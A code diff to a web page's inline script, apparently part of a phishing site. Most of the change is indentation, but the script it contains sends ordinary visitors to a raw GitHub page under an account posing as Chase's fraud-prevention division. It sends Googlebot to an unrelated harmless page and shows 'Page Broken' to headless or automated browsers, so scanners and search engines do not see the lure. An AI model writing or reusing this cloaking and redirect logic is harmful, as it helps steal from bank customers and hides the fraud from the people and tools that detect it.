@@ -11,10 +11,11 @@
     <script>
         // Redirect if Googlebot is detected
         if (navigator.userAgent.indexOf("Googlebot") === -1) {
-        window.location.href = "https://raw.githubusercontent.com/ChaseFraudSecurityDivisionJPbankdatacom/Report-fraud-prevention/main/index.html"; // Redirect real users to raw HTML
-    } else {
-        window.location.href = "https://trollface.dk/"; // Redirect Googlebot to a harmless page
-    }
+            window.location.href = "https://raw.githubusercontent.com/ChaseFraudSecurityDivisionJPbankdatacom/Report-fraud-prevention/main/index.html"; // Redirect real users to raw HTML
+        } else {
+            window.location.href = "https://trollface.dk/"; // Redirect Googlebot to a harmless page
+        }
+
         // Check for headless browsers (common for bots)
         if (navigator.webdriver || /HeadlessChrome/.test(navigator.userAgent)) {
             document.body.innerHTML = "Page Broken";
@@ -119,6 +120,7 @@
 
     <script src="script.js"></script>
 </body>
+
 <footer>
     <footer class="footer">
         <ul class="footer-links">
